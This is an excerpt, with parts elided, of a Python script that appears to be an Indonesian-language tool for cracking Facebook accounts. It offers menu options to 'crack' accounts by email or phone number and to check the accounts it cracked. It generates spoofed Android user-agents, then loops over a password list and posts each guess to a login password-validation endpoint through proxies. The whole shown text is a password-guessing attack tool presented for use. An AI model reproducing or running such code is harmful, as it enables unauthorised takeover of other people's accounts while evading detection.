...
#	A__ = f'Mozilla/5.0 (Linux; U; Android {str(rr(1,10))}.{str(rr(1,10))}.{str(rr(1,10))}; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
	A_ = f'Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
...
def no_login():
	...
	print(f" [{hh}4{P}] crack dari email")
	print(f" [{hh}5{P}] crack dari nomor")
	print(f" [{hh}6{P}] cek hasil akun")
	print(f" [{hh}7{P}] ganti fitur login")
	ask = input(f" menu : ")
	...
	try:
		...
		for pw in pwx:
			...
			hd2 = {'accept': '*/*',
				...
				'Host': url,
				'origin': f"https://"+url,
				'referer': f'https://'+url+'/login/device-based/password/?uid={idf}&flow=fx_reauth',
				'user-agent': ua,
			...
			bx = ses.post(f'https://{url}/login/validate-password/?shbl=0', headers=hd2, data=date, proxies=proxy)
